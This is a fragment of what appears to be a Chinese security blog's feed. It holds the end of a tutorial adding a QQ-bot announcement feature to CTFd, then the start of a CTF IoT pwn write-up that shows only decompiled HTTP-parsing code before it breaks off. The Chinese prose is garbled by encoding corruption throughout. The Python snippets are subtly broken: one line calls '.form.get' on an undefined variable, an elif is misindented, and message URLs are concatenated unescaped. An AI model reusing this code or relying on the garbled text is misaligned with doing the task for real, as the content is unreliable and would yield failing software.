class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>Description for the CTF<br><span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ctf_description&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ctf_description&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;5&quot;</span>&gt;</span>&#123;&#123; ctf_description &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;bot-ip&quot;</span>&gt;</span><br>                Bot Address<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    the address of QQ-bot<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    eg. 127.0.0.1:1234<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;bot-ip&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;bot_ip&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">&#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot_ip</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">bot_ip</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; bot_ip &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;group-id&quot;</span>&gt;</span><br>                QQ Group Number<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;group-id&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;group_id&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">&#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">group_id</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">group_id</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; group_id &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;bot-text&quot;</span>&gt;</span><br>                è§£é¢˜æ’­æŠ¥æ¶ˆæ¯æ ¼å¼<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    ep. æ­å–œ%såšå‡ºé¢˜ç›®%sï¼Œé»˜è®¤ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç”¨æˆ·åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºé¢˜ç›®åç§°<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;bot-text&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;bottext&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">   &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bottext</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">bottext</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; bottext &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;create-text&quot;</span>&gt;</span><br>                é¢˜ç›®å¯è§æ’­æŠ¥<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    ep. é¢˜ç›®%så·²ç™»å…¥å¹³å°<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;create-text&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;createtext&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">   &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">createtext</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">createtext</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; createtext &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;update-text&quot;</span>&gt;</span><br>                é¢˜ç›®æ›´æ–°æ’­æŠ¥<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    ep. é¢˜ç›®%så†…å®¹å·²æ›´æ–°<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;update-text&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;updatetext&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">   &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">updatetext</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">updatetext</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; updatetext &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;botof&quot;</span>&gt;</span><br>                Turn on the Bot<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control custom-select&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;botof&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bot&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">0</span> &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot</span> == <span class="hljs-string">0</span> %&#125;<span class="hljs-attr">selected</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>                        OFF<br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">1</span> &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot</span> == <span class="hljs-string">1</span> %&#125;<span class="hljs-attr">selected</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>                        ON<br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-md btn-primary float-right&quot;</span>&gt;</span>Update<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h3><p><img src="/img/article/botv2/image-20221108200540771.png" alt="image-20221108200540771"></p><h2 id="åç«¯æ›´æ”¹"><a href="#åç«¯æ›´æ”¹" class="headerlink" title="åç«¯æ›´æ”¹"></a>åç«¯æ›´æ”¹</h2><h3 id="views-py"><a href="#views-py" class="headerlink" title="views.py"></a>views.py</h3><p>æ‰“å¼€<code>CTFd/CTFd/views.py</code>ï¼Œæ·»åŠ å˜é‡<code>createtext</code>å’Œ<code>updatetext</code>ï¼Œç”¨äºæ¥æ”¶htmlé¡µé¢æ•°æ®</p><p><img src="/img/article/botv2/image-20221108200717361.png" alt="image-20221108200717361"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Robot</span><br>bot = request.form.get(<span class="hljs-string">&quot;bot&quot;</span>)<br>bottext = request.form.get(<span class="hljs-string">&quot;bottext&quot;</span>)<br>createtext = request.form.get(<span class="hljs-string">&quot;createtext&quot;</span>)<br>updatetext = updatetext.form.get(<span class="hljs-string">&quot;updatetext&quot;</span>)<br>group_id = request.form.get(<span class="hljs-string">&quot;group_id&quot;</span>) <span class="hljs-comment">#qqç¾¤å·</span><br>bot_ip = request.form.get(<span class="hljs-string">&quot;bot_ip&quot;</span>) <span class="hljs-comment">#æœºå™¨äººæœåŠ¡åœ°å€,å¦‚ 127.0.0.1:8000</span><br>set_config(<span class="hljs-string">&quot;bot&quot;</span>, bot)<br>set_config(<span class="hljs-string">&quot;bottext&quot;</span>, bottext)<br>set_config(<span class="hljs-string">&quot;createtext&quot;</span>, createtext)<br>set_config(<span class="hljs-string">&quot;updatetext&quot;</span>, updatetext)<br>set_config(<span class="hljs-string">&quot;group_id&quot;</span>,group_id)<br>set_config(<span class="hljs-string">&quot;bot_ip&quot;</span>,bot_ip)<br></code></pre></td></tr></table></figure><h3 id="challenge-py"><a href="#challenge-py" class="headerlink" title="challenge.py"></a>challenge.py</h3><p>æ‰“å¼€<code>CTFd/CTFD/api/v1/challenges.py</code>ï¼Œåœ¨<code>patch</code>å‡½æ•°å†…å¢åŠ ä¸€æ®µä»£ç ï¼Œåœ¨æ›´æ–°é¢˜ç›®ä¿¡æ¯åè¿›è¡Œé€»è¾‘åˆ¤æ–­ï¼Œåè°ƒç”¨æœºå™¨äººçš„API</p><p><img src="/img/article/botv2/image-20221108201009252.png" alt="image-20221108201009252"></p><p>å®Œæ•´å‡½æ•°ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch</span>(<span class="hljs-params">self, challenge_id</span>):<br>    data = request.get_json()<br>    <span class="hljs-comment">#<span class="hljs-doctag">TODO:</span></span><br>    <span class="hljs-comment"># Load data through schema for validation but not for insertion</span><br>    schema = ChallengeSchema()<br>    response = schema.load(data)<br>    <span class="hljs-keyword">if</span> response.errors:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;errors&quot;</span>: response.errors&#125;, <span class="hljs-number">400</span><br><br>    challenge = Challenges.query.filter_by(<span class="hljs-built_in">id</span>=challenge_id).first_or_404()<br>    state_before = challenge.state<br>    challenge_class = get_chal_class(challenge.<span class="hljs-built_in">type</span>)<br>    challenge = challenge_class.update(challenge, request)<br>    response = challenge_class.read(challenge)<br>    <span class="hljs-comment">#ROBOT send message when update the information of challenge</span><br>    bot = get_config(<span class="hljs-string">&quot;bot&quot;</span>)<br>    <span class="hljs-keyword">if</span> (bot):<br>        group_id = get_config(<span class="hljs-string">&quot;group_id&quot;</span>)<br>        bot_ip = get_config(<span class="hljs-string">&quot;bot_ip&quot;</span>)<br>        boturl = <span class="hljs-string">&quot;http://&quot;</span>+<span class="hljs-built_in">str</span>(bot_ip)+<span class="hljs-string">&quot;/send_group_msg?group_id=&quot;</span>+<span class="hljs-built_in">str</span>(group_id)+<span class="hljs-string">&quot;&amp;message=&quot;</span><br>        <span class="hljs-keyword">if</span>(challenge.state!=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-keyword">and</span> challenge.state!=<span class="hljs-string">&quot;locked&quot;</span>):<br>            <span class="hljs-keyword">if</span>(state_before==<span class="hljs-string">&quot;hidden&quot;</span>):<br>                bottext = get_config(<span class="hljs-string">&quot;createtext&quot;</span>)<br>                botmessage = (bottext) % (challenge.name)<br>                url = boturl + botmessage<br>                requests.get(<span class="hljs-built_in">str</span>(url))<br>             <span class="hljs-keyword">elif</span>(state_before!=<span class="hljs-string">&quot;hidden&quot;</span>):<br>                bottext = get_config(<span class="hljs-string">&quot;updatetext&quot;</span>)<br>                botmessage = (bottext) % (challenge.name)<br>                url = boturl + botmessage<br>                requests.get(<span class="hljs-built_in">str</span>(url))<br><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&quot;data&quot;</span>: response&#125;<br></code></pre></td></tr></table></figure><blockquote><p>åç»­åœ¨å¢åŠ ä¸€äºŒä¸‰è¡€å§ï¼Œè¿™ä¸ªåŠŸèƒ½ç•¥æœ‰ç‚¹éº»çƒ¦</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>iæ˜¥ç§‹æ˜¥å­£èµ›-å‹‡è€…å·…å³°-chunqiuIOT</title>
    <link href="/2022/11/03/i%E6%98%A5%E7%A7%8B%E6%98%A5%E5%AD%A3%E8%B5%9B-%E5%8B%87%E8%80%85%E5%B7%85%E5%B3%B0-chunqiuIOT/"/>
    <url>/2022/11/03/i%E6%98%A5%E7%A7%8B%E6%98%A5%E5%AD%A3%E8%B5%9B-%E5%8B%87%E8%80%85%E5%B7%85%E5%B3%B0-chunqiuIOT/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ˜¯ä»Šå¹´ä¸ŠåŠå¹´æ¯”èµ›çš„ä¸€é“é¢˜ç›®ï¼Œé‚£ä¸ªæ—¶å€™æ‰åˆšåˆšæ¥è§¦å †ï¼Œæ ˆä¹Ÿä¸æ˜¯å¾ˆç†Ÿã€‚æ‰“å¼€ç¨‹åºåŸºæœ¬å°±æ”¾å¼ƒäº†ï¼Œå‰ä¸€æ®µæ—¶é—´å¤ç°äº†å‡ ä¸ªIOTç›¸å…³çš„CVEï¼Œå€Ÿæ­¤å¥‘æœºé¡ºä¾¿çœ‹çœ‹å‡ ä¸ªæœˆå‰è‡ªå·±æ”¾å¼ƒçš„é‚£é“é¢˜ã€‚æœ‰ä¸€è¯´ä¸€ï¼Œè¿™é“é¢˜çš„é€†å‘éƒ¨åˆ†è¿˜æ˜¯å¾ˆå¤´ç–¼çš„ï¼Œé€†äº†ä¸€ä¸ªä¸‹åˆ+ä¸€ä¸ªæ—©ä¸Šæ‰çœ‹å®Œç¨‹åºé€»è¾‘â€”-å¥—çš®å †é¢˜ç½¢äº†ã€‚</p><blockquote><p>æˆ‘æ–°å»ºäº†ä¸€ä¸ªåº“ï¼Œç”¨äºå­˜æ”¾å„ç§æ¯”èµ›çš„é¢˜ç›®ï¼Œæˆ‘åšå®¢å†…WPæ¶‰åŠçš„é¢˜ç›®åŸºæœ¬éƒ½èƒ½æ‰¾åˆ°ï¼Œé“¾æ¥ï¼š<a href="https://github.com/Loora1N/PWNchanllenge/tree/main/chunzhiIot">PWNchanllenge&#x2F;chunzhiIot at main Â· Loora1N&#x2F;PWNchanllenge (github.com)</a></p></blockquote><h2 id="é€†å‘éƒ¨åˆ†"><a href="#é€†å‘éƒ¨åˆ†" class="headerlink" title="é€†å‘éƒ¨åˆ†"></a>é€†å‘éƒ¨åˆ†</h2><p>é¦–å…ˆæ‰¾åˆ°ä¸»å‡½æ•°ï¼Œæ¯”è¾ƒç®€ä»‹ï¼Œå¾ªç¯è¯»å…¥ä¸€ä¸ª<code>0X3FF</code>å­—èŠ‚ï¼Œç„¶åå¯¹<code>s</code>è¿›è¡Œè§£æå¤„ç†</p><p><img src="/img/article/chunqiuiot/image-20221103201403318.png" alt="image-20221103201403318"></p><p>è·Ÿè¿›<code>1BDC</code>å‡½æ•°</p><p><img src="/img/article/chunqiuiot/image-20221103202054328.png" alt="image-20221103202054328"></p><p>è¿™é‡Œæœ‰è…¾å‡ºäº†ä¸€ä¸ªå­—ç¬¦ä¸²ç©ºé—´ï¼Œè·Ÿè¿›<code>sub_1852</code>å‡½æ•°ã€‚</p><blockquote><p>å› ä¸ºæˆ‘æ”¹äº†ä¸€éƒ¨åˆ†å˜é‡åå’Œå‡½æ•°åï¼Œæ‰€ä»¥å¯èƒ½ä¸ç›´æ¥åæ±‡ç¼–é™¤äº†ç»“æœç•¥æœ‰ä¸åŒ</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_1852</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1, __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">char</span> *haystack; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">int</span> cnt; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> *v5; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *front_part; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>  <span class="hljs-type">char</span> *s2a; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s2b; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  haystack = a1;<br>  cnt = <span class="hljs-number">1</span>;<br>  v5 = <span class="hljs-built_in">strstr</span>(a1, <span class="hljs-string">&quot;\r\n&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( v5 )<br>  &#123;<br>    v5[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>    *v5 = <span class="hljs-number">0</span>;<br>    v5 += <span class="hljs-number">2</span>;                                    <span class="hljs-comment">// trans &quot;\r\n&quot; into &quot;\x00&quot;+&quot; &quot;</span><br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v5 &amp;&amp; cnt &lt;= <span class="hljs-number">15</span> )<br>  &#123;<br>    front_part = strtok(haystack, <span class="hljs-string">&quot; &quot;</span>);<br>    <span class="hljs-keyword">if</span> ( cnt == <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;GET&quot;</span>, front_part) )<br>      &#123;<br>        *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">1</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;HEAD&quot;</span>, front_part) )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;POST&quot;</span>, front_part) )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;PUT&quot;</span>, front_part) )<br>          &#123;<br>            <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;DELETE&quot;</span>, front_part) )<br>            &#123;<br>              <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;TRACE&quot;</span>, front_part) )<br>              &#123;<br>                <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;OPTIONS&quot;</span>, front_part) )<br>                &#123;<br>                  <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;CONNECT&quot;</span>, front_part) )<br>                  &#123;<br>                    <span class="hljs-keyword">if</span> ( *(a2 + <span class="hljs-number">16</span>) || <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;DEV&quot;</span>, front_part) )<br>                      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>                    *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">8</span>;<br>                  &#125;<br>                  <span class="hljs-keyword">else</span><br>                  &#123;<br>                    *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">7</span>;<br>                  &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                  *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">6</span>;<br>                &#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span><br>              &#123;<br>                *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">5</span>;<br>              &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>              *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">4</span>;<br>            &#125;<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">3</span>;<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">2</span>;<br>        &#125;<br>      &#125;<br>      <span 